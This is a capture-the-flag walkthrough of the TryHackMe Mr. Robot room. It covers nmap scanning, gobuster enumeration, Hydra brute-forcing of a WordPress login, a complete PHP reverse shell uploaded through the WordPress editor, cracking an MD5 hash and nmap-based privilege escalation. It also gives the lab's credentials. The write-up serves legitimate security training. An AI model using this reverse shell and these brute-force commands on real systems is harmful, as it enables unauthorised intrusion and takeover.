# Mr. Robot CTF

## Initial Scan
Scan the target IP with nmap to identify open ports and services:
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_30_09](https://github.com/user-attachments/assets/a85bb534-6a81-4e13-b89d-36a6a281a1e6)
nmap -sC -sV -oA scan 10.10.95.162
Results: Three ports identified two ports are open.

## Web Exploration
Visiting the target IP in a web browser redirects to a unique and stylized web page inspired by the TV show "Mr. Robot." The web page offers several commands:

prepare: Displays a video.

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_30_53](https://github.com/user-attachments/assets/2b68247d-8759-41a5-b167-427367449fe3)

fsociety: Displays a video.

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_31_45](https://github.com/user-attachments/assets/8747e6a4-21df-482f-b3b9-a9dc24afbec2)

inform: Shows pictures.

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_32_12](https://github.com/user-attachments/assets/f5a7297f-4158-498a-a22d-9fdf75059b9e)

question: Shows pictures.

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_32_59](https://github.com/user-attachments/assets/6ca56c64-0738-4211-9138-62ea1fbcae04)

wakeup: Shows a film.

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_33_35](https://github.com/user-attachments/assets/36e3ecb2-f3d2-42fc-822d-fa09ab4bdd87)

join: A prompt to join.

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_34_07](https://github.com/user-attachments/assets/7984608a-3b0c-42c5-8676-3692738125df)

## Source Code Analysis
View the source code of the website.
Findings: Message YOU ARE NOT ALONE.
Hint: Suggests checking 'robots'

## First Key and Wordlist
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_37_19](https://github.com/user-attachments/assets/3331d791-c00a-4565-9568-395c40d7b4d2)
Navigate to http://10.10.10.10/robots.txt.
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_37_45](https://github.com/user-attachments/assets/a0ea2758-d095-4c52-809f-5938c24e04cb)
Findings: First key and fsocity.dic wordlist.
Flag 1

## Directory Enumeration
Use gobuster to find additional web pages:
Command: `gobuster dir -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
   - Found the `/wp-login` page indicating a WordPress site.
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_38_21](https://github.com/user-attachments/assets/6b36f9b2-41a4-440b-a633-0b2416077cbe)

## Brute Forcing Login Credentials
Attempting to brute force the username using fsocity.dic as the wordlist:
Command: `hydra -L fsocity.dic -p test 10.10.10.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:invalid username" -t 30`
   - Successfully found the username: `Elliot`.
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_54_17](https://github.com/user-attachments/assets/89acda0a-d2f5-4ee0-aee1-b9b2b5c9adb6)

Next, brute forcing the password for the username Elliot:
Command: `hydra -l Elliot -P fsocity.dic 10.10.10.10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=302"`
   - Successfully found the password ER28-0652 and logged into the WordPress admin panel.
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_55_26](https://github.com/user-attachments/assets/85f14756-1c5f-4a27-b014-3aea64248e35)
Upon successful login, we can now upload plugins via the WordPress admin panel.

## Reverse Shell via WordPress Editor
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_01_58_16](https://github.com/user-attachments/assets/b1bb2c7b-3811-4ab7-b47b-f9f818d962d7)
Modify PHP Reverse Shell script
_____________________________________________________________
`<?php

set_time_limit(0);
$VERSION = "1.0";

// Replace with your IP and port
$ip = 'YOUR_IP';  // CHANGE THIS
$port = 1234;     // CHANGE THIS

$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();

    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }

    if ($pid) {
        exit(0);
    }

    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}

?> `
_____________________________________________________________
Upload the modified script

## Start a netcat listener on the local machine:
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_08_08](https://github.com/user-attachments/assets/9d240f2e-216d-45c4-934f-de79df8b07e4)
Command: `nc -lvnp 1234`

## Activate Reverse Shell
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_08_08](https://github.com/user-attachments/assets/a9be1d60-40d1-4a1a-98d2-2b2f966f2f77)

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_08_13](https://github.com/user-attachments/assets/13755c19-9328-4952-b706-b78a6c2e1e9e)

The /home/robot directory contains a file password.raw-md5 with the following content:
robot:c3fcd3d76192e4007dfb496cca67e13b

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_09_25](https://github.com/user-attachments/assets/1dd19792-2a52-448e-b570-db4e7291ba74)

## Crack the MD5 hash using Cracknation
Result: Password is `abcdefghijklmnopqrstuvwxyz`.

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_10_25](https://github.com/user-attachments/assets/c2e15024-e70b-498f-bf5e-d8d2cdf6d2ae)

## Switching User
python -c 'import pty; pty.spawn("/bin/bash")'
su robot
Password: abcdefghijklmnopqrstuvwxyz

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_13_18](https://github.com/user-attachments/assets/da5bf96c-57e0-477b-82c5-455a6bd1be1a)
Flag 2

## Find files with SUID bit set:
find / -perm -4000 2>/dev/null

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_20_47](https://github.com/user-attachments/assets/6e01275c-39f1-42e8-a01d-593e0284bddb)

Noticed nmap binary.

## Use nmap for privilege escalation (referencing GTFOBins):
nmap --interactive
!sh
![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_21_09](https://github.com/user-attachments/assets/ca3388dd-a162-4497-968b-9a92148f2b84)

![VirtualBox_kali-linux-2024 2-virtualbox-amd64_26_07_2024_02_23_17](https://github.com/user-attachments/assets/8a2f1308-99db-4820-a1e3-e57397be19c1)
Locate the final key in the /root directory.
Flag 3

## Tools Used
   ### Nmap: 
   For initial scanning and service enumeration.
   ### Gobuster: 
   For directory enumeration.
   ### Hydra: 
   For brute-forcing login credentials.
   ### Netcat: 
   For establishing a reverse shell.
   ### PHP Reverse Shell: 
   Script for reverse shell access via WordPress.
   ### GTFOBins: 
   For privilege escalation techniques.

## Flags
First Key: Found in `robots.txt`.
Second Key: Found in `/home/robot`.
Final Key: Found in `/root`.

## Conclusion
This detailed walkthrough guides you through solving the Mr. Robot CTF challenge on TryHackMe. It covers all steps from initial reconnaissance, brute-forcing login credentials, gaining shell access, and escalating privileges to retrieve all flags. The journey mirrors the intriguing elements of the Mr. Robot TV show, making it a fun and educational experience.
